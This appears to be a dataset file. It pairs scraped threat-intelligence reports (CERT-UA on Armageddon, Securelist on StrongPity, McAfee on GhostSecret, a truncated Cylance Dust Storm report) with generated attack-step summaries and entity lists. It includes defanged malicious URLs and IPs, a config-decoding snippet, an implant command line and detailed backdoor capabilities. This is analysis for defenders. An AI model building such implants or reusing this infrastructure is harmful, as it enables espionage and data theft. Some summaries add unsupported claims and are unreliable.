date:&nbsp 17 April 2018Written by:&nbsp Nikolaos Pantazopoulos7/7 ","1. A malicious executable is executed on the victim machine. 2. The executable drops a batch file (install.bat) and a cabinet file (data.cab) containing encrypted shellcode and a DLL. 3. The batch file executes to decompress and run the DLL. 4. The shellcode decrypts itself and loads plugins from the attacker. 5. The primary RAT tool ""Mozilla"" connects to the C2 server over SSL or TCP. 6. The attacker sends plugins to the victim machine via Mozilla. These plugins enable capabilities like command execution, file transfer, etc. 7. Network traffic is encrypted with RC4 using a per-message key. 8. The attacker makes use of the access and capabilities provided by the RAT plugins. ",valid_26,"['the victim', 'a batch file', 'install.bat', 'a cabinet file', 'Data', 'the batch file', 'the DLL', 'the shellcode', 'plugins', 'the attacker', 'RAT', 'Mozilla', 'the C2 server', 'SSL', 'TCP', 'capabilities', 'execution', 'Network traffic', 'RC4', 'PE', 'message', 'key', 'use']",the victim; a batch file; install.bat; a cabinet file; Data; the batch file; the DLL; the shellcode; plugins; the attacker; RAT; Mozilla; the C2 server; SSL; TCP; capabilities; execution; Network traffic; RC4; PE; message; key; use.
"cert-gov-ua.translate.goog /article/39386 Cyber attack of UAC-0010 group (Armageddon) on state organizations of Ukraine (CERT-UA # 4434)Cyber attack of UAC-0010 group (Armageddon) on state organizations of Ukraine (CERT-UA # 4434)general informationThe Governmental Team for Response to Computer Emergencies of Ukraine CERT-UA received an e- mail from the coordinating subject with the subject ""№1275 from 07.04.2022"", containing the HTML file of the same name, the opening of which will lead to the creation of an archive on the computer "" 1275_07.04.2022.rar "". The latter contains an LNK file ""On the facts of persecution and murder of prosecutors by the Russian military in the temporarily occupied territories.lnk"", the opening of which will lead to the download and launch of the payload.The activity is associated with the activities of the group UAC-0010 (Armageddon).In order to ensure the resilience of their infrastructure, team members, among other things, use Dynamic DNS service NO-IP. We pay attention to the expediency of monitoring connections with domain names used by the mentioned service. The list of free domain names is below; an extensive list is available at hxxps: //www.noip [.] com / support / faq / free-dynamic-dns-domains /.Indicators of compromiseFiles: 1275_07.04.2022.htm 1275_07.04.2022.rar 1275_07.04.2022 (1) .rar hXXp: //m-vz.webhop [.] me / prk / faicon.ico hXXp: //a0656203.xsph [.] ru / prescription / seized.xml hXXp: //a0656203.xsph [.] ru / prepared / semi.xml m-vz.webhop [.] me a0656203.xsph [.] ru a0322810.xsph [.] ru lnk-upload.dodortar [.] ru dod-upload.dodortar [.] ru ln-upl.ddns [.] no d-upl.ddns [.] no up-dot.myftp [.] org up-lnk.myftp [.] org 194 [.] 58,121,198 194 [.] 180,174,105 149 [.] 248.13.58List of free domain names of the NO-IP service: serveftp [.] com2/3servegame [.] com zapto [.] orgGraphic images3/3 ","1. The attackers sent emails with HTML attachments pretending to be coordinating subjects to targets. 2. The HTML attachment contained a link to download a RAR archive file. 3. The RAR archive contained a LNK file that when opened downloaded and executed a malware payload. 4. The malware payload likely enabled further access, activity and data exfiltration on the infected host and network. ",valid_29,"['RAR', 'LNK', 'activity']",RAR; LNK; activity.
"2016/10/14On the StrongPity Waterhole Attacks - SecurelistOn the StrongPity Waterhole Attacks Targeting Italian and Belgian Encryption UsersBy Kurt Baumgartner on October 3, 2016. 11:40 pmINCIDENTS RESEARCHAPT CYBER ESPIONAGE SOCIAL ENGINEERING TARGETED ATTACKS WATERING HOLE WEBSITE HACKSKurt Baumgartner Principal Security Researcher, GReAT@k_secThe StrongPity APT is a technically capable group operating under the radar for several years. The group has quietly deployed zero day in the past, effectively spearphished targets, and maintains a modular toolset. What is most interesting about this group’s more recent activity however, is their focus on users of encryption tools, peaking this summer. In particular, the focus was on Italian and Belgian users, but the StrongPity watering holes affected systems in far more locations than just those two. Adding in their creative waterholing and poisoned installer tactics, we describe the StrongPity APT as not only determined and well  resourced, but fairly reckless and innovative as well.Encryption ToolsClearly this APT is interested in encrypted data and communications. The tools targeted by this group enable practices for securing secrecy and integrity of data. For example, WinRAR packs and encrypts files with strong suites like AES 256, and TrueCrypt encrypts full hard drives all in one swoop. Both WinRAR and TrueCrypt help provide strong and reliable encryption. WinRAR enables a person to encrypt a file with AES url the StrongPity Waterhole Attacks - Securelist256 in CBC mode with a strong PBKDF2 HMAC SHA256 based key. And, TrueCrypt provides an effective open source full disk encryption solution for Windows, Apple, Linux, and Android systems. Using both of these tools together, a sort of one off, poor man’s end to end encryption can be maintained for free by putting these two solutions together with free file sharing services.Other software applications help to support encrypted sessions and communications. Well known applications supporting end to  end encryption are used by hundreds of millions of folks, sometimes unknowingly, every day. IM clients like Microsoft’s Skype implement 256 bit AES encrypted communications, while Putty, Winscp and Windows Remote Desktop help provide private communications and sessions with fully encrypted communications as well. Most of these communications across the wire are currently unbreakable when intercepted, at least, when the applications are configured properly.Summer 2016 Watering Hole Resources and Trickery – WinRAR and TrueCryptThis actor set up a particularly clever site to deliver trojanized WinRAR installers in the summer of 2016, appears to have compromised another, and this activity reminds us somewhat of the early 2014 Crouching Yeti activity. Much of the Crouching Yeti intrusions were enabled by trojanizing legitimate ICS related IT software installers like SCADA environment vpn client installers and industrial camera software driver installers. Then, they would compromise the legitimate company software distribution sites and replace the legitimate installers with the Crouching Yeti trojanized versions. The tactics effectively compromised ICS and SCADA related facilities and networks around the world. Simply put, even when visiting a legitimate company distribution site, IT staff was downloading and installing ICS focused malware. StrongPity’s efforts did much the same.In the case of StrongPity, the attackers were not focused on ICS or SCADA. They set up a domain name (ralrab[.]com) mimicking the legitimate WinRAR distribution siteurl the StrongPity Waterhole Attacks - Securelist(rarlab[.]com), and then placed links on a legitimate “certified distributor” site in Europe to redirect to their poisoned installers hosted on ralrab[.]com. In Belgium, the attackers placed a “recommended” link to their ralrab[.]com site in the middle of the localized WinRAR distribution page on winrar[.]be. The big blue recommended button (here in French) linked to the malicious installer, while all the other links on the page directed to legitimate software:Winrar[.]be site with “recommended link” leading tomalicious ralrab[.]comThe winrar[.]be site evaluated what “recommended” package a visitor may need based on browser localization and processor capability, and accordingly offered up appropriate trojanized versions. Installer resources named for french and dutch versions, along with 32 bit versus 64 bit compiled executables were provided over the summer:hxxp://www.ralrab[.]com/rar/winrar x64 531.exe hxxp://www.ralrab[.]com/rar/winrar x64 531fr.exe hxxp://www.ralrab[.]com/rar/winrar x64 531nl.exe hxxp://www.ralrab[.]com/rar/wrar531.exe hxxp://www.ralrab[.]com/rar/wrar531fr.exe hxxp://www.ralrab[.]com/rar/wrar531nl.exe hxxp://ralrab[.]com/rar/winrar x64 531.exe hxxp://ralrab[.]com/rar/winrar x64 531nl.exe hxxp://ralrab[.]com/rar/wrar531fr.exe hxxp://ralrab[.]com/rar/wrar531nl.exe hxxp://ralrab[.]com/rar/wrar53b5.exeurl the StrongPity Waterhole Attacks - SecurelistDirectory listing, poisoned StrongPity installers, atrarlrab[.]comThe first available visitor redirects from winrar[.]be to ralrab[.]com first appeared on May 28th, 2016, from the dutch speaking version of the winrar.be site. And around the same time, another “certified distributor” winrar[.]it served trojanized installers as well. The major difference here is that we didn’t record redirections to ralrab[.]com, but it appears the site directly served StrongPity trojanized installers:hxxps://www.winrar[.]it/prelievo/WinRAR x64 531it.exe hxxps://www.winrar[.]it/prelievo/WRar531it.exeThe site started serving these executables a couple of days earlier on 5/24, where a large majority of Italian visitors where affected.url the StrongPity Waterhole Attacks - SecurelistDownload page, winrar[.]itQuite simply, the download links on this site directed visitors to trojanized WinRAR installers hosted from the winrar.it site itself. It’s interesting to note that both of the sites are “distributors”, where the sites are owned and managed not by rarlabs, but by local owners in individual countries.StrongPity also directed specific visitors from popular, localized software sharing sites directly to their trojanized installers. This activity continued into late September 2016. In particular, the group redirected visitors from software aggregation and sharing site tamindir[.]com to their attacker controlled site at true  crypt[.]com. The StrongPity controlled Truecrypt site is a complete rip of the legitimate site, now hosted by Sourceforge. Here is the Tamindir truecrypt page, looks harmless enough.TrueCrypt page, tamindir software sharing siteUnlike the newer poisoned WinRAR installers, StrongPity hosted several Much like the poisoned WinRAR installers, multiple filenames have been used to keep up with visitor interests. Visitors may have been directed to the site by other means and downloaded directly from the ripped and persuasive site.url the StrongPity Waterhole Attacks - Securelisttrue crypt[.]com malicious StrongPity distribution siteAt the very bottom of the page, there are a couple of links to the poisoned installers:hxxp://www.true crypt[.]com/download/TrueCrypt Setup  7.1a.exe hxxp://true crypt[.]com/files/TrueCrypt 7.2.exeReferrers include these localized software aggregates and sharers:gezginler[.]net/indir/truecrypt.html tamindir[.]com/truecrypt/indirIt’s interesting that Ksn recorded appearance of the the file on two unique systems in December 2015, a third in January 2016, all in Turkey, and then nothing until May 2016. Then, deployment of the installers continued mostly within Turkey in July and September 2016.Summer 2016 Watering Hole Victimurl – WinRAR6/112016/10/14Geolocations – WinRAR and TrueCryptOn the StrongPity Waterhole Attacks - SecurelistOver the course of a little over a week, malware delivered from winrar.it appeared on over 600 systems throughout Europe and Northern Africa/Middle East. Likely, many more infections actually occurred. Accordingly, the country with the overwhelming number of detections was in Italy followed by Belgium and Algeria. The top countries with StrongPity malware from the winrar.it site from May 25th through the first few days of June are Italy, Belgium, Algeria, Cote D’Ivoire, Morroco, France, and Tunisia.winrar[.]it StrongPity component geolocation distributionIn a similar time span, the over sixty visitors redirected from winrar.be to ralrab.com for malicious file download were overwhelmingly located in one country. The top countries directed to StrongPity malware from the winrar.be site from May 25th through the first few days of June are Belgium, Algeria, Morroco, Netherlands, Canada, Cote D’Ivoire, and Tunisia.url the StrongPity Waterhole Attacks - Securelistwinrar[.]be StrongPity component geolocation distributionStrongPity previously set up TrueCrypt themed watering holes in late 2015. But their offensive activity surged in late summer 2016. The group set up a site directly pulled from the contents of the legitimate TrueCrypt website. From mid July to early September, dozens of visitors were redirected from tamindir[.]com to true  crypt[.]com with unsurprisingly almost all of the focus on systems in Turkey, with victims in the Netherlands as well.tamindir[.]com to true crypt[.]com poisoned TrueCryptinstaller redirectsStrongPity MalwareThe StrongPity droppers were often signed with unusual digital certificates, dropping multiple components that not only provide complete control of the victim system, but effectively steal disk contents, and can download components for further collection of various communications and contacts. Because we are talking about StrongPity watering holes, let’s take a quick look at what is being delivered by the group from these sites.url the StrongPity Waterhole Attacks - SecurelistWhen we count all systems from 2016 infected with any one of the StrongPity components or a dropper, we see a more expansive picture. This data includes over 1,000 systems infected with a StrongPity component. The top five countries include Italy, Turkey, Belgium, Algeria, and France.In the case of the winrar[.]be/ralrab[.]com watering hole malware, each one of the six droppers that we observed created a similar set of dropped components on disk. And, in these cases, the attackers did not re use their fake digital certificates. In addition to installing the legitimate version of WinRAR, the dropper installed the following StrongPity components:%temp%\procexp.exe wrlck.dllOf these files, two are configurable and encrypted with the same keyless cipher, “wrlck.cab” and “prst.cab”. While one maintains several callback c2 for the backdoor to fetch more instructions and upload installed software and file paths, the other maintains something a bit more unusual. “prst.cab” maintains an encrypted list of programs that maintain encrypted connections. This simple encoding takes the most significant nibble for each character, swaps the nibbles of that byte, and xors the result against the original value. Its code looks something like this:x = s[i];url the StrongPity Waterhole Attacks - Securelistj = ((x & 0xF0)>>4); y = x ^ j;Using that cipher in the ralrab[.]com malware, the package is configured to seek out several crypto enabled software applications, highlighting the group’s interest in users of more encryption supported software suites.putty.exe (a windows SSH client) filezilla.exe (supports ftps uploads) winscp.exe (a windows secure copy application, providing encrypted and secure file transfer) mstsc.exe (Windows Remote Desktop client, providing an encrypted connection to remote systems) mRemoteNG.exe (a remote connections manager supporting SSH, RDP, and other encrypted protocols)Also included in StrongPity components are keyloggers and additional data stealers.ConclusionWidely available, strong cryptography software tools help provide secure and private communications that are now easily obtained and usable. In the summer of 2016, multiple encryption enabled software applications were targeted with watering hole, social engineering tactics, and spyware by the StrongPity APT. While watering holes and poisoned installers are tactics that have been effectively used by other APT, we have never seen the same focus on cryptographic enabled software. When visiting sites and downloading encryption enabled software, it has become necessary to verify the validity of the distribution site and the integrity of the downloaded file itself. Download sites not using PGP or strong digital code signing certificates need to re examine the necessity of doing so for their own customers. We have seen other APT such as Crouching Yeti and Darkhotel distribute poisoned installers and poisoned executable code, then redistribute them through similar tactics and over p2p networks. Hopefully, simpler verification systems than the current batch of PGP and SSL applications will arise to be adopted in larger numbers. Until then, strong anti malware and dynamic whitelisting solutions will be more necessary than ever.More information about the StrongPity APT group is available to customers of Kaspersky Intelligent Services. Contact: intelreports@kaspersky.com Related Postsurl PostsOn the StrongPity Waterhole Attacks - SecurelistWAVE YOUR FALSE FLAGS!POLYGLOT – THE ANDROID 6url ",1. StrongPity registers domains mimicking legitimate encryption software sites. 2. They compromise or partner with distributor sites to insert links to their fake domains. 3. Users are redirected from distributor sites to the fake domains when clicking links. 4. The fake sites serve trojanized software installers to victims. 5. Installers drop malware that provides remote access and steals data. 6. Malware exfiltrates data from encryption software like SSH and RDP. 7. Configuration data reveals focus on stealing encrypted communications. 8. StrongPity maintains access to monitor victims and spread to new systems. 9. Over 1000 systems were compromised across Europe and North Africa. 10. The watering hole campaign focused on Italian and Belgian encryption users. ,valid_76,"['StrongPity', 'software', 'sites', 'links', 'installers', 'victims', 'Malware', 'data', 'SSH', 'RDP', 'focus', 'encrypted communications', 'systems', '10', 'Europe', 'watering hole', 'Italian and Belgian encryption users']",StrongPity; software; sites; links; installers; victims; Malware; data; SSH; RDP; focus; encrypted communications; systems; 10; Europe; watering hole; Italian and Belgian encryption users.
"Analyzing Operation GhostSecret: Attack Seeks to Steal Data WorldwideBy Ryan Sherstobitoff and Asheer Malhotra on Apr 24, 2018McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications. ThisPDF generated automatically by the PDFmyURL HTML to PDF APINewsletter Sign UpFirst Name *Last Name *campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra. The infrastructure currently remains active. In this post, we dive deeply into this campaign. For a brief overview of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other Industries.”Email Address *Country * --Please Select--Our investigation into this campaign reveals that the actor used multiple malware implants, including an unknown implant with capabilities similar to Bankshot. From March 18 to 26 we observed the malware operating in multiple areas of the world. This new variant resembles parts of the Destover malware, which was used in the 2014 Sony Pictures attack.Furthermore, the Advanced Threat Research team has discovered Proxysvc, which appears to be an undocumented implant. We have also uncovered additional control servers that are still active and associated with these new implants. Based on our analysis of public and private information from submissions, along with product telemetry, it appears Proxysvc was used alongside the 2017 Destover variant and has operated undetected since mid-2017.The attackers behind Operation GhostSecret used a similar infrastructure to earlier threats, including SSL certificates used by FakeTLS in implants found in the Destover backdoor variant known as Escad, which was used in the Sony Pictures attack. Based on our technical analysis, telemetry, and data from submissions, we can assert with high confidence that this is the work of the Hidden Cobra group. The Advanced Threat Research team uncovered activity related to this campaign in March 2018, when the actors targeted Turkish banks. These initial findings appear to be the first stage of Operation GhostSecret. For more on the global aspect of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure of Entertainment, Finance, Health Care, and Other Industries.”SubmitMcAfee on Twitter  Follow us on Twittermcafee_labsOperation GhostSecret is targeting a number of industries using implants, tools, and #malware variants associated w… url 4 hours ago Reply · Retweet · Favoritemcafee_labsRT @WSJ: Data-theft offensive with suspected links to North KoreanPDF generated automatically by the PDFmyURL HTML to PDF APIAnalysisThe McAfee Advanced Threat Research team discovered a previously unknown data- gathering implant that surfaced in mid-February 2018. This implant appears to be a derivative of implants authored before by Hidden Cobra and contains functionality similar to that of Bankshot, with code overlaps from other Hidden Cobra implants. However, the variant is not based on Bankshot. Our analysis of the portable executable’s rich-header data reveals that the two implants were compiled in different development environments. (The PE rich header is an undocumented part of a Windows executable that reveals unique information to identify the Microsoft compiler and linker used to create the program. It is helpful for identifying similarities between malware variants to establish common development environments.) Our analysis of the code and PE rich header indicates that Bankshot, Proxysvc, and the Destover-like implant are distinct families, but also contain overlapping code and functionality with current tools of Hidden Cobra.hackers has hit 17 countries, including the U.S., report says url… 5 hours ago Reply · Retweet · Favoritemcafee_labs.@timothywmartin shares the evolution of North Korea’s cyber army. Details on #cyberattacks over the past 18 months… url 7 hours ago Reply · Retweet · FavoriteNext ArticlePE rich header data from the 2018 Bankshot implant.PDF generated automatically by the PDFmyURL HTML to PDF APIMcAfee Labs Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other IndustriesPE rich header data from the new February 2018 implant.PE rich header data from Proxysvc.dll.When we compared the PE rich header data of the new February 2018 implant with a variant of Backdoor.Escad (Destover) from 2014 shortly before the Sony Pictures attack, we found the signatures to be identical. The Destover-like variant is 83% similar in code to a 2015 variant and contains the same rich PE header signature as the Backdoor.Escad variant we analyzed. Thus the new implant is likely a derivative of components of Destover. We determined that the implant is not a direct copy of well-known previous samples of Destover; rather, Hidden Cobra created a new hybrid variant using an unknown submitter in the United States on February 14, two days after it was The implant is nearly identical to an unknown 2017 sample use FakeTLS with PolarSSL, which we saw in previous Hidden Cobra implants. PolarSSL libraries have appeared in implants since the Sony Pictures incident and were used exclusively in the implant Backdoor.Destover. This implant incorporated a custom control server protocol that sends traffic over port 443. The implementation does not format the packets in standard SSL, but rather in a custom format and transmitted over SSL—hence, FakeTLS. The control server traffic when compared to Backdoor.Escad is components involved in the overall infrastructure. Proxysvc.dll contains a list of hardcoded IP addresses, including the preceding address, all located in India. Despite the name, this component is not an SSL proxy, but rather a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections.Proxysvc was first collected by public and private sources on March 22 from an unknown entity in the United States. The executable dropper for the component was submitted from South Korea on March 19. McAfee telemetry analysis from March 16 to 21 reveals that Proxysvc components were active in the wild. Our research shows this listener component appeared mostly in higher education organizations. We suspect this component is involved in core control server infrastructure. These targets were chosen intentionally to run Proxysvc because the attacker would have needed to know which systems were infected to connect to them. This data also indicates this infrastructure had been operating for more than a year before its discovery. The Advanced Threat Research team found this component running on systems in 11 countries. Given the limited capabilities of Proxysvc, it appears to be part of a covert network of SSL listeners that allow the attackers to gather data and install more complex implants or additional infrastructure. The SSL listener supports multiple control server connections, rather than a list of hardcoded addresses. By removing the dependency on hardcoded IP addresses and accepting only inbound connections, the control service can remain unknown.PDF generated automatically by the PDFmyURL HTML to PDF APIThe number of infected systems by country in which Proxysvc.dll was operating in March. Source: McAfee Advanced Threat Research.The 2018 Destover-like implant appeared in organizations in 17 countries between March 14 and March 18. The impacted organizations are in industries such as telecommunications, health, finance, critical infrastructure, and entertainment.PDF generated automatically by the PDFmyURL HTML to PDF APIThe number of infected systems by country in which the Destover variant was operating in March. Source: McAfee Advanced Threat Research.Control ServersFurther investigation into the control server infrastructure reveals the SSL certificate University in Bangkok, Thailand. The same entity hosted the control server for the Sony Pictures implants. This SSL certificate has been used in Hidden Cobra operations sincePDF generated automatically by the PDFmyURL HTML to PDF APIthe Sony Pictures attack. Analyzing this certificate reveals additional control servers using the same PolarSSL certificate. Further analysis of McAfee telemetry data reveals several IP addresses that are active, two within the same network block as the 2018 Destover-like implant.Number of infections by Thammasat University–hosted control servers from March 15–19, 2018. Source: McAfee Advanced Threat Research.PDF generated automatically by the PDFmyURL HTML to PDF APIImplant OriginsMcAfee Advanced Threat Research determined that the Destover-like variant originated from code developed in 2015. The code reappeared in variants surfacing in 2017 and 2018 using nearly the same functionality and with some modifications to commands, along with an identical development environment based on the rich PE header August 8, 2015, we found it 83% similar to the implant from 2018. The key similarities and differences follow.SimilaritiesBoth variants build their API imports dynamically using GetProcAddress, including wtsapi32.dll for gathering user and domain names for any active remote sessions Both variants contain a variety of functionalities based on command IDs issued by the control servers Common capabilities of both malware:Listing files in directory Creating arbitrary processes Writing data received from control servers to files on disk Gathering information for all drives Gathering process times for all processes Sending the contents of a specific file to the control server Wiping and deleting files on disk Setting the current working directory for the implant Sending disk space information to the control serverPDF generated automatically by the PDFmyURL HTML to PDF APIBoth variants use a batch file mechanism to delete their binaries from the system Both variants run commands on the system, log output to a temporary file, and send the contents of the file to their control serversDifferencesThe following capabilities in the 2015 implant are missing from the 2018 variant:Creating a process as a specific user Terminating a specific process Deleting a specific file Setting file times for a specific file Getting current system time and sending it to the control server Reading the contents of a file on disk. If the filepath specified is a directory, then listing the directory’s contents. Setting attributes on filesThe 2015 implant does not contain a hardcoded value of the IP address it must connect to. Instead it contains a hardcoded sockaddr_in data structure (positioned at 0x270 bytes before the end of the binary) used by the connect() API to specify port 443 and control in-the-middle traffic interception). However, a closer analysis of the sample reveals it is yet another implant using HTTP over SSL to receive commands from the control server.Proxysvc appears to be a downloader whose primary capability is to deliver additional payloads to the endpoint without divulging the control address of the attackers. This implant contains a limited set of capabilities for reconnaissance and subsequent payload installations. This implant is a service DLL that can also run as a standalone process.The ServiceMain() sub function of Proxysvc.The implant cannot connect to a control server IP address or URL. Instead it acceptsPDF generated automatically by the PDFmyURL HTML to PDF APIcommands from the control server. The implant binds and listens to port 443 for any incoming connections.Proxysvc binding itself to the specified port.Proxysvc begins accepting incoming requests to process.PDF generated automatically by the PDFmyURL HTML to PDF APIProxysvc makes an interesting check while accepting connections from a potential control server. It checks against a list of IP addresses to make sure the incoming connection is not from any of the following addresses. If the incoming request does come from one of these, the implant offers a zero response (ASCII “0”) and shuts down the Content-Type and Content-Length from the HTTP header. If the HTTP Content-Type matches the following value, then the implant executes the command specified by the control server:Content-Type: 8U7y3Ju387mVp49AHTTP Content-Type comparison with a custom implant value.The implant has the following capabilities:PDF generated automatically by the PDFmyURL HTML to PDF APIWriting an executable received from the control server into a temp file and executing itProxysvc writing a binary to a temp directory and executing it.Gathering system information and sending it to the control server. The system information gathered from the endpoint includes:PDF generated automatically by the PDFmyURL HTML to PDF APIMAC address of the endpoint Computer Name Product name from HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName This information is concatenated into a single string in the format: “MAC_Address|ComputerName|ProductName” and is sent to the control serverRecording HTTP requests from the control server to the temporary file prx in the implant’s install directory with the current system timestampAnalyzing the Main ImplantThe February 2018 implant contains a wide variety of capabilities including data exfiltration and arbitrary command execution on the victim’s system. Given the extensive command structure that the implant can receive from the control server, this is an extensive framework for data reconnaissance and exfiltration, and indicates advanced use. For example, the implant can wipe and delete files, execute additional implants, read data out of files, etc.The implant begins execution by dynamically loading APIs to perform malicious activities. Libraries used to load the APIs include:Kernel32.dll Ntdll.dllPDF generated automatically by the PDFmyURL HTML to PDF APIPDF generated automatically by the PDFmyURL HTML to PDF APIThe main implant dynamically loading APIs.As part of its initialization, the implant gathers basic system information and sends it to Operating system version Processor description fromHKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameStringComputer name and network adapters information Disk space information for disks C: through Z: including total memory in bytes, total available memory in bytes, etc. Current memory status including total physical memory in bytes, total available memory, etc. Domain name and usernames based on current remote sessionsPDF generated automatically by the PDFmyURL HTML to PDF APIDomain name and username extraction using Win32 WTS APIs.Data ReconnaissanceThe implant receives commands over SSL as encoded data. This data is decoded, and the correct command ID is derived. Valid command IDs reside between 0 and 0x1D.Switch case handling command execution based on command IDs.Based on the command ID, the implant can perform the following functions:PDF generated automatically by the PDFmyURL HTML to PDF APIGather system information and exfiltrate to the control server (same as the basic data- gathering functionality previously described) Get volume information for all drives on the system (A: through Z:) and exfiltrate to the control serverGathering volume information.List files in a directory. The directory path is specified by the control server. Read the contents of a file and send it to the control serverPDF generated automatically by the PDFmyURL HTML to PDF APIPDF generated automatically by the PDFmyURL HTML to PDF APIReading file contents and sending it the control server.Write data sent by the control server to a specified file pathOpen handle to a file for writing with no shared permissions.Writing data received from control server to file.Create new processes based on the file path specified by the control server.PDF generated automatically by the PDFmyURL HTML to PDF APICreating a new process for a binary specified by the control server.Wipe and delete files specified by the control serverPDF generated automatically by the PDFmyURL HTML to PDF APIWiping and deleting files.Execute a binary on the system using cmd.exe and log the results into a temp file, which is then read and the logged results are sent to the control server. The command line:cmd.exe /c “<file_path> > %temp%\PM*.tmp 2>&1”PDF generated automatically by the PDFmyURL HTML to PDF APIExecuting a command and logging results to a temp file.Get information for all currently running processesPDF generated automatically by the PDFmyURL HTML to PDF APIGetting process times for all processes on the system.PDF generated automatically by the PDFmyURL HTML to PDF APIGetting username and domain from accounts associated with a running process.Delete itself from disk using a batch file.PDF generated automatically by the PDFmyURL HTML to PDF APIPDF generated automatically by the PDFmyURL HTML to PDF APICreating a batch file for self-deletion.Store encoded data received from the control server as a registry value at:HKLM\Software\Microsoft\Windows\CurrentVersion\TowConfigs DescriptionSet and get the current working directory for the implantSetting and getting the current working directory for the implant’s process.The command handler index table is organized in the implant as follows:PDF generated automatically by the PDFmyURL HTML to PDF APIThe command handler index table.ConclusionThis analysis by the McAfee Advanced Threat Research team has found previously undiscovered components that we attribute to Hidden Cobra, which continues to target organizations around the world. The evolution in complexity of these data-gathering implants reveals an advanced capability by an attacker that continues its development of tools. Our investigation uncovered an unknown infrastructure connected to recent operations with servers in India using an advanced implant to establish a covert network to gather data and launch further attacks.The McAfee Advanced Threat Research team will provide further updates as ourPDF generated automatically by the PDFmyURL HTML to PDF APIinvestigation develops.Fighting cybercrime is a global effort best undertaken through effective partnerships between the public and private sectors. McAfee is working with Thai government authorities to take down the control server infrastructure of Operation GhostSecret, while preserving the systems involved for further analysis by law enforcement authorities. By creating and maintaining partnerships with worldwide law enforcement, McAfee demonstrates that we are stronger together.Indicators of CompromiseMcAfee detectionTrojan-Bankshot2MITRE ATT&CK techniquesExfiltration over control server channel: data is exfiltrated over the control server channel using a custom protocol Commonly used port: the attackers used common ports such as port 443 for control server communications Service execution: registers the implant as a service on the victim’s machine Automated collection: the implant automatically collects data about the victim and sends it to the control server Data from local system: local system is discovered and data is gathered Process discovery: implants can list processes running on the system System time discovery: part of the data reconnaissance method, the system time is also sent to the control server  Tags: advanced persistent threats, cybercrime, cybersecurity, malwareLeave a replyFacebook Comments (0) Comments (0) G+ CommentsPDF generated automatically by the PDFmyURL HTML to PDF API0 CommentsSort byNewestAdd a comment Facebook Comments PluginLeave a CommentCommentName *Email *Please enter an answer in digits: eighteen − fifteen =Post Comment Post CommentAbout | Subscribe | Contact & Media Requests | Privacy Policy | Legal © 2018 McAfee LLCPDF generated automatically by the PDFmyURL HTML to PDF API Close MenuSearchBusiness EnglishFollow us  AboutSubscribeContact & Media RequestsPrivacy PolicyLegal © McAfee LLCPDF generated automatically by the PDFmyURL HTML to PDF API ","1. The attackers compromise websites and routers to use as watering holes and initial infection vectors. 2. The Proxysvc implant is installed silently on target machines to create backdoors over SSL on port 443. 3. Proxysvc gathers system information and can download additional payloads from command servers. 4. Newer Bankshot and Destover malware variants are delivered via Proxysvc. 5. The malware gathers data from the infected system and exfiltrates it to command servers over SSL. 6. Bankshot and Destover can also spread laterally, install more implants, wipe systems, and execute arbitrary commands. 7. The command servers use SSL certificates linked to previous Hidden Cobra operations to control the implants. ",valid_72,"['the attackers', 'us', 'Proxysvc', 'Backdoor', 'port', '443', 'system information', 'additional payloads', 'servers', 'Bankshot', 'Destover', 'malware variants', 'the malware', 'Data', 'Wipe', 'systems', 'commands', 'the command', 'SSL certificates', 'Hidden Cobra operations', 'control', 'the implants']",the attackers; us; Proxysvc; Backdoor; port; 443; system information; additional payloads; servers; Bankshot; Destover; malware variants; the malware; Data; Wipe; systems; commands; the command; SSL certificates; Hidden Cobra operations; control; the implants.
"O P E R A T I O N O P E R A T I O N O P E R A T I O ND U S T D U S T D U S T D U S T D U S T D U S T D U S T S T O R MBy Jon Gross and S T O R M S T O R M S T O R M S T O R M the Cylance SPEAR™ TeamOPERATION DUST STORM1Identity Crisis: Zero-Day Attacks Into the Future: Japanese TargetsImplant Analysis:F Cauthority so much as silence.”01 Executive Summary 01 The Early Days: Spear Phishing 05 Here and Now: Companies Compromised 07 Misdat Backdoor (2010-2011) 10 MiS-Type Hybrid Backdoor (2012) 13 S-Type Backdoor (2013-2014) 16 Zlib Backdoor (2014-2015) 21 Appendix “Nothing strengthens Cylance SPEAR has uncovered a long-standing persistent threat targeting numerous major industries spread across Japan, South Korea, the United States, Europe, and several other Southeast Asian countries. Power comes in many forms Our research indicates Operation Dust Storm has been operational since at least early 2010, and has employed a number of different operational techniques, including spear phishing, waterholes, and zero-day exploits over time. Several antivirus companies initially detected early backdoor samples under the moniker Misdat, but the group has quietly evolved over the years to remain undetected and highly effective. Attack telemetry in 2015 indicates the Dust Storm group has migrated from more traditional government and defense-related intelligence targets to exclusively seek out organizations involved in Japanese critical infrastructure and resources. The group recently compromised a wide breadth of victims across the following industry verticals: electricity generation, oil and natural gas, finance, transportation, and construction. SPEAR’s current research indicates the group’s present focus has shifted to specifically and exclusively target Japanese companies or Japanese subdivisions of larger foreign organizations.1 During analysis of older command and control infrastructure, there were several domains that resolved to known malicious IP addresses in September 2009. However, SPEAR was not able to corroborate these dates in any known malware samples.OPERATION DUST STORM1-Leonardo da VinciThe Early Days: Spear Phishing The earliest indications of the group’s activities stem from the compile times of the executable resource section of Misdat samples. All of the early backdoor samples were compiled using a version of Delphi which notoriously mangles the compilation timestamp of the file to June 19, 1992 22:22:17 UTC. By using the executable resource section timestamp, SPEAR was able to more accurately gauge the actual compile times of these samples, and traced one of them, to January 20101.Very little public information was available throughout 2010 on this threat, despite the group’s primary backdoor gaining some level of prominence in targeted Asian attacks. This may be explained by the group’s early reliance on Dynamic DNS domains for their command and control (C2) infrastructure, as well as their use of public RATs like Poison Ivy and Gh0st RAT for second-stage implants. The actors relied heavily on the free Dynamic DNS providers No-IP (url Oray (http:// www.oray.com/) and 3322 (url for their infrastructure continuing into 2011; the earliest known backdoors SPEAR identified communicated to “323332.3322.org” and “1stone.zapto.org”. It wasn’t until June 2011 that Operation Dust Storm started to garner some notoriety from a series of attacks which leveraged an unpatched Internet Explorer 8 vulnerability, CVE-2011-1255, to gain a foothold into victim networks. In these attacks, a link to the exploit was sent via a spear 